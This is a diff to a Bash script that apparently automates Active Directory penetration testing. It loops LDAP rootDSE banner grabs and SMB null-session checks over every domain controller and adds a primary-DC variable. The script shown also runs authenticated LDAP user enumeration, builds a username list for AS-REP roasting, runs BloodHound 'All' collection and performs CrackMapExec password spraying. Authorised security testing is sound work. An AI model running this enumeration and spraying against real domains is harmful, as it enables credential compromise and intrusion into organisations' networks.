@@ -25,6 +25,7 @@ detect_system_resources
 # ─── RUNTIME REQUIREMENTS ────────────────────────────────────────────────────
 require_var "DOMAIN_NAME"; require_var "DC_IP"; require_var "TARGET_SUBNETS"
 require_var "ATTACKER_INTERFACE"
+set_primary_dc   # sets PRIMARY_DC = first IP in DC_IP
 
 # Domain credentials only required by steps that authenticate to AD.
 # Skipped when --only selects network-only steps (host_sweep, nmap_fullscan).
@@ -419,38 +420,38 @@ if [[ -f "${SMB_OUT}" ]]; then
 fi
 unset _smb_sweep_ran
 
-# ─── STEP 1.4 — LDAP DC BANNER GRAB (active — quick) ─────────────────────────
+# ─── STEP 1.4 — LDAP DC BANNER GRAB (active — all DCs) ──────────────────────
 LDAP_OUT="${OUT_AD}/ldap_rootdse.txt"
 if ! skip_if_exists "${LDAP_OUT}" "LDAP rootdse" "ldap_banner"; then
-    log INFO "Grabbing LDAP rootdse from DC: ${DC_IP}"
-    log_cmd "${NMAP_BIN} -p 389 --script ldap-rootdse ${DC_IP}"
-    # Gate the active NSE probe behind checkpoint() so the operator has an
-    # explicit opt-in for every DC-targeted LDAP probe. `ldap-rootdse` is
-    # low-noise but still generates an authenticated-anonymous LDAP bind
-    # that shows up in DC security logs.
-    if checkpoint "Run LDAP rootDSE banner grab against DC ${DC_IP} (nmap NSE — generates one LDAP probe)?"; then
-        "${NMAP_BIN:-nmap}" -p 389 --script ldap-rootdse "${DC_IP}" \
-            -oN "${LDAP_OUT}" 2>&1 | tee -a "${OUT_AD}/ldap.log"
-        log OK "LDAP rootdse collected → ${LDAP_OUT}"
+    log INFO "Grabbing LDAP rootdse from all DCs: ${DC_IP}"
+    if checkpoint "Run LDAP rootDSE banner grab against all DCs (${DC_IP}) — generates one LDAP probe per DC?"; then
+        : > "${LDAP_OUT}"
+        for _dc in ${DC_IP}; do
+            log_cmd "${NMAP_BIN} -p 389 --script ldap-rootdse ${_dc}"
+            echo "### DC: ${_dc}" >> "${LDAP_OUT}"
+            "${NMAP_BIN:-nmap}" -p 389 --script ldap-rootdse "${_dc}" \
+                -oN - 2>&1 | tee -a "${OUT_AD}/ldap.log" >> "${LDAP_OUT}" || true
+        done
+        unset _dc
+        log OK "LDAP rootdse collected (all DCs) → ${LDAP_OUT}"
     else
-        log INFO "LDAP rootdse skipped — run manually: nmap -p 389 --script ldap-rootdse ${DC_IP}"
+        log INFO "LDAP rootdse skipped — run manually per DC: nmap -p 389 --script ldap-rootdse <DC_IP>"
     fi
 fi
 
-# ─── STEP 1.5 — LDAP USER ENUMERATION (active — quick) ───────────────────────
+# ─── STEP 1.5 — LDAP USER ENUMERATION (active — primary DC) ─────────────────
+# Uses PRIMARY_DC only — all DCs share the same AD partition; querying one is enough.
 LDAP_USERS_OUT="${OUT_AD}/ldap_users.txt"
 if ! skip_if_exists "${LDAP_USERS_OUT}" "LDAP user enumeration" "ldap_users"; then
-    log INFO "Enumerating domain users via LDAP..."
-    log_cmd "ldapsearch -H ldap://${DC_IP} -D ${DOMAIN_USER}@${DOMAIN_NAME} -w *** -b DC=..."
-    ldapsearch -H "ldap://${DC_IP}" \
+    log INFO "Enumerating domain users via LDAP (primary DC: ${PRIMARY_DC})..."
+    log_cmd "ldapsearch -H ldap://${PRIMARY_DC} -D ${DOMAIN_USER}@${DOMAIN_NAME} -w *** -b DC=..."
+    ldapsearch -H "ldap://${PRIMARY_DC}" \
         -D "${DOMAIN_USER}@${DOMAIN_NAME}" \
         -w "${DOMAIN_PASS}" \
         -b "$(echo "DC=${DOMAIN_NAME}" | sed 's/\./,DC=/g')" \
         '(objectClass=user)' sAMAccountName mail memberOf userAccountControl \
         2>&1 > "${LDAP_USERS_OUT}" || log WARN "LDAP query failed — check credentials and DC reachability"
 
-    # Extract clean username list for Phase 3 (AS-REP roasting).
-    # || true: grep exits 1 when ldapsearch returned nothing (auth failure, empty OU).
     grep 'sAMAccountName:' "${LDAP_USERS_OUT}" | awk '{print $2}' \
         | grep -v -E '^\$' \
         > "${OUT_AD}/userlist.txt" || true
@@ -458,16 +459,21 @@ if ! skip_if_exists "${LDAP_USERS_OUT}" "LDAP user enumeration" "ldap_users"; th
     log OK "LDAP users collected: ${UCOUNT} accounts → ${OUT_AD}/userlist.txt"
 fi
 
-# ─── STEP 1.6 — SMB NULL SESSION CHECK (active — instant) ───────────────────
+# ─── STEP 1.6 — SMB NULL SESSION CHECK (active — all DCs) ───────────────────
 if ! _step_is_skipped "null_session"; then
-    log INFO "Checking for SMB null session (should be blocked)..."
-    log_cmd "${CME_BIN} smb ${DC_IP} --null-session"
-    "${CME_BIN}" smb "${DC_IP}" --null-session \
-        2>&1 > "${OUT_AD}/nullsession_check.txt" || true
+    log INFO "Checking for SMB null session on all DCs (${DC_IP})..."
+    : > "${OUT_AD}/nullsession_check.txt"
+    for _dc in ${DC_IP}; do
+        log_cmd "${CME_BIN} smb ${_dc} --null-session"
+        echo "### DC: ${_dc}" >> "${OUT_AD}/nullsession_check.txt"
+        "${CME_BIN}" smb "${_dc}" --null-session \
+            2>&1 >> "${OUT_AD}/nullsession_check.txt" || true
+    done
+    unset _dc
     if grep -q 'STATUS_ACCESS_DENIED\|STATUS_LOGON_FAILURE' "${OUT_AD}/nullsession_check.txt" 2>/dev/null; then
-        log OK "Null session blocked (expected)"
+        log OK "Null session blocked on all checked DCs"
     else
-        log WARN "Null session may be accessible — review: ${OUT_AD}/nullsession_check.txt"
+        log WARN "Null session may be accessible on one or more DCs — review: ${OUT_AD}/nullsession_check.txt"
     fi
 fi
 
@@ -494,7 +500,7 @@ else
             -u "${DOMAIN_USER}" \
             -p "${DOMAIN_PASS}" \
             -d "${DOMAIN_NAME}" \
-            -ns "${DC_IP}" \
+            -ns "${PRIMARY_DC}" \
             -c All \
             --zip \
             -w "${BH_WORKERS:-20}" \
@@ -621,8 +627,8 @@ else
                     continue
                 fi
                 log INFO "Spray attempt $((attempt+1)): password = [REDACTED FROM LOG]"
-                log_cmd "${CME_BIN} smb ${DC_IP} -u ${OUT_AD}/userlist.txt -p *** -d ${DOMAIN_NAME} --continue-on-success"
-                "${CME_BIN}" smb "${DC_IP}" \
+                log_cmd "${CME_BIN} smb ${PRIMARY_DC} -u ${OUT_AD}/userlist.txt -p *** -d ${DOMAIN_NAME} --continue-on-success"
+                "${CME_BIN}" smb "${PRIMARY_DC}" \
                     -u "${OUT_AD}/userlist.txt" \
                     -p "${pwd}" \
                     -d "${DOMAIN_NAME}" \
